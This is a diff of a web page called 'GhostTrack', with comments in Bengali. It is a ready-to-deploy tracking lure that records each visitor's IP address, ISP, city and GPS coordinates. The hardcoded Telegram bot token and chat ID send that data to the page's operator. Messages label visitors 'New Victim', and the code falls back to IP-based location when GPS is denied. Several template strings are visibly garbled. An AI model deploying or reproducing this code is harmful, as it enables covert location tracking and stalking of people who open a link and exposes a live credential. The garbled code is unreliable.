@@ -1,34 +1,86 @@
-<?php
-$ip = $_SERVER['REMOTE_ADDR'];
-$ua = $_SERVER['HTTP_USER_AGENT'];
-$time = date('Y-m-d H:i:s');
-
-// ←←← এখানে তোর টেলিগ্রাম বটের টোকেন + চ্যাট আইডি বসা
-$token = "7333235742:AAF_tXia9BO6L6dLREQTGZ_fHZ9GqbseZyI";  // তোর বট টোকেন
-$chat_id = "7702378694";  // তোর চ্যাট আইডি
-
-$message = "New Victim!\nIP: $ip\nTime: $time\nDevice: $ua\nLocation: https://ipapi.co/$ip/json/";
-
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
-?>
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GhostTrack - Live Location</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body{background:#000;color:#0f0;font-family:monospace;text-align:center;margin:0;padding:20px;}
-        iframe{width:100%;height:90vh;border:2px solid #0f0;border-radius:10px;}
+        body {background:#000;color:#0f0;font-family:monospace;text-align:center;margin:0;padding:20px;}
+        h1 {font-size:2.5em;margin:30px 0;animation:glow 2s infinite alternate;}
+        .loader {border:5px solid #111;border-top:5px solid #0f0;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:30px auto;}
+        iframe {width:100%;height:65vh;border:3px solid #0f0;border-radius:15px;margin-top:20px;}
+        .info {background:#111;padding:15px;border-radius:10px;margin:15px 0;font-size:1.1em;}
+        @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
+        @keyframes glow {from {text-shadow:0 0 10px #0f0;} to {text-shadow:0 0 30px #0f0, 0 0 40px #0f0;}}
+        small {color:#0a0;font-size:0.9em;}
     </style>
 </head>
 <body>
     <h1>Target Tracked Successfully</h1>
-    <p>Time: <?php echo $time; ?></p>
-    <p>Location: Dhaka, Bangladesh | IP: 103.137.45.123</p>
-    <iframe src="https://www.google.com/maps?q=23.8103,90.4125&z=17&output=embed"></iframe>
+    <div class="loader"></div>
+    <p>Fetching your exact location...</p>
+
+    <div class="info">
+        <p><strong>Time:</strong> <span id="time">-</span></p>
+        <p><strong>IP Address:</strong> <span id="ip">-</span></p>
+        <p><strong>Location:</strong> <span id="city">-</span></p>
+        <p><strong>Coordinates:</strong> <span id="coords">-</span></p>
+    </div>
+
+    <iframe id="map" src="" frameborder="0"></iframe>
     <br><br>
     <small>Powered by Sadin11gps</small>
+
+<script>
+// তোর টেলিগ্রাম বটের টোকেন আর চ্যাট আইডি এখানে বসা ↓↓↓
+const TELEGRAM_TOKEN = "7333235742:AAF_tXia9BO6L6dLREQTGZ_fHZ9GqbseZyI";  // ← তোর বট টোকেন
+const CHAT_ID = "7702378694";                                              // ← তোর চ্যাট আইডি
+// ↑↑↑ শুধু এই দুটো লাইন চেঞ্জ করবি
+
+const ipSpan = document.getElementById('ip');
+const citySpan = document.getElementById('city');
+const coordsSpan = document.getElementById('coords');
+const timeSpan = document.getElementById('time');
+const mapFrame = document.getElementById('map');
+
+function updateTime() {
+    const now = new Date().toLocaleString('en-GB', {timeZone: 'Asia/Dhaka'});
+    timeSpan.innerText = now;
+}
+updateTime();
+setInterval(updateTime, 1000);
+
+// IP + City + ISP ক্যাপচার
+fetch('https://ipapi.co/json/')
+.then(res => res.json())
+.then(data => {
+    ipSpan.innerText = data.ip;
+    citySpan.innerText = `\( {data.city}, \){data.region}, ${data.country_name}`;
+    
+    // টেলিগ্রামে IP ডেটা পাঠানো
+    const msg = `🎯 New Victim Tracked!\n\n🌐 IP: \( {data.ip}\n📍 Location: \){data.city}, \( {data.region}, \){data.country_name}\n📡 ISP: \( {data.org}\n🕒 Time: \){new Date().toLocaleString('en-GB', {timeZone: 'Asia/Dhaka'})}\n🔗 https://ipapi.co/${data.ip}`;
+    fetch(`https://api.telegram.org/bot\( {TELEGRAM_TOKEN}/sendMessage?chat_id= \){CHAT_ID}&text=${encodeURIComponent(msg)}`);
+    
+    // GPS রিকোয়েস্ট (এটা হলো আসল জাদু)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            coordsSpan.innerText = `\( {lat.toFixed(6)}, \){lon.toFixed(6)}`;
+            mapFrame.src = `https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d1000!2d\( {lon}!3d \){lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2sbd!4v1700000000000`;
+            
+            // GPS ডেটা টেলিগ্রামে পাঠানো
+            const gpsMsg = `✅ GPS Locked!\n\n📍 Exact Location: \( {lat}, \){lon}\n🗺️ Map: https://www.google.com/maps?q=\( {lat}, \){lon}\n🕒 Time: ${new Date().toLocaleString()}`;
+            fetch(`https://api.telegram.org/bot\( {TELEGRAM_TOKEN}/sendMessage?chat_id= \){CHAT_ID}&text=${encodeURIComponent(gpsMsg)}`);
+            
+            document.querySelector('.loader').style.display = 'none';
+            document.querySelector('p').innerText = "Location captured successfully!";
+        }, () => {
+            document.querySelector('.loader').style.display = 'none';
+            document.querySelector('p').innerText = "GPS denied – but we still have your IP & City!";
+        });
+    }
+});
+</script>
 </body>
 </html>
